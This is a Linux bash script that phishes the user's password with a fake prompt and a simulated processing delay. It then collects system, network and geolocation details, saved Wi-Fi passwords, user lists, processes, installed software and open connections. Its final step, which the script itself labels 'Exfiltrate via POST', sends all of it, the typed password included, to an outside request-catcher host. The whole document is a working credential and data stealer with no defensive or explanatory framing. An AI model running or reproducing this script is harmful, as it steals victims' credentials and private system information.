
#!/bin/bash

# === Prompt for user password ===
read -s -p "🔐 Please enter your password to proceed: " user_password
echo

# === Validate input ===
if [[ -z "$user_password" ]]; then
    echo "❌ No input detected. Exiting."
    exit 1
fi

# === Delay to simulate processing ===
sleep 4

# === Basic System Info ===
os_info=$(lsb_release -a 2>/dev/null)
kernel_info=$(uname -a)
hostname_info=$(hostnamectl)
current_user=$(whoami)
home_dir="/home/$current_user"

# === Network Info ===
public_ip=$(curl -s https://ipinfo.io/ip)
local_ip=$(hostname -I)
mac_address=$(ip link | grep -A1 "state UP" | grep ether | awk '{print $2}')
wifi_networks=$(nmcli -f SSID,BSSID,SIGNAL dev wifi list 2>/dev/null)

# === WLAN Profiles ===
wifi_profiles=$(grep -r '^psk=' /etc/NetworkManager/system-connections/ 2>/dev/null)

# === Geolocation (IP-based) ===
location_data=$(curl -s https://ipinfo.io/loc)

# === Users and Groups ===
user_list=$(cut -d: -f1 /etc/passwd)
group_info=$(groups)

# === Password Policies ===
password_policy=$(chage -l "$current_user" 2>/dev/null)

# === Processes, Services, Software ===
running_processes=$(ps aux)
enabled_services=$(systemctl list-unit-files --type=service --state=enabled)
installed_software=$(dpkg-query -W -f='${binary:Package} ${Version}\n')

# === Devices and Disks ===
disk_info=$(lsblk)
serial_devices=$(dmesg | grep tty)

# === TCP Connections ===
tcp_connections=$(ss -tunapl)

# === Exfiltrate via POST ===
curl -X POST https://flipped.requestcatcher.com \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "debug=
==== [USER PASSWORD] ====
$user_password

==== [OS INFO] ====
$os_info

==== [KERNEL] ====
$kernel_info

==== [HOSTNAME] ====
$hostname_info

==== [CURRENT USER] ====
$current_user

==== [PUBLIC IP] ====
$public_ip

==== [LOCAL IP] ====
$local_ip

==== [MAC ADDRESS] ====
$mac_address

==== [WIFI NETWORKS] ====
$wifi_networks

==== [WIFI PROFILES & PASSWORDS] ====
$wifi_profiles

==== [LOCATION (IP-BASED)] ====
$location_data

==== [USER LIST] ====
$user_list

==== [GROUP INFO] ====
$group_info

==== [PASSWORD POLICY] ====
$password_policy

==== [PROCESSES] ====
$running_processes

==== [SERVICES] ====
$enabled_services

==== [SOFTWARE] ====
$installed_software

==== [DISK INFO] ====
$disk_info

==== [SERIAL DEVICES] ====
$serial_devices

==== [TCP CONNECTIONS] ====
$tcp_connections
"
